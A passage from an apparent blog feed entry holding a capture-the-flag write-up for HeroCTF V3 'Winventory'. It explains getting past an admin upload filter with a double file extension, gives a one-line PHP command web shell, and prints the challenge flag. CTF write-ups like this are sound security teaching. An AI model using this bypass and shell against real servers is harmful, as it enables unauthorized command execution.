\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;. BINGO it works\nGo to admin pannel and bypass filters to upload your own PHP reverse shell So we are logged in as admin a tab attracts our attention: \u0026ldquo;Administration\u0026rdquo;\nOnce on this page, we upload an image.jpg for testing, and it works:\nBut when we upload an image.php file (our shell) it doesn\u0026rsquo;t work :\nWe will therefore have to bypass these filters, there are several ways and the most classic is adding a double extension to our filename, like this: image.jpg.php (Why would that work? Well it could be that the backend code that handle file upload split file name on the \u0026ldquo;.\u0026rdquo; but only check the second element(the extension of the file) assuming the filenames are only of the form something.extension)\nOur image.jpg.php :\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;And \u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.. BINGO it works :\nNow we just have to browse through the server directories and hope to find a dodgy file that might contain the flag, which can be found quickly:\nFLAG : Hero{sql1_t0_lf1_t0_rc3_b4d_s3cur1ty}\n","date":"2021-04-26T00:00:00Z","image":"https://endeavxor.github.io/p/heroctf-v3-winventory/cover.jpg","permalink":"https://endeavxor.github.io/p/heroctf-v3-winventory/","title":"HeroCTF V3 - Winventory"}]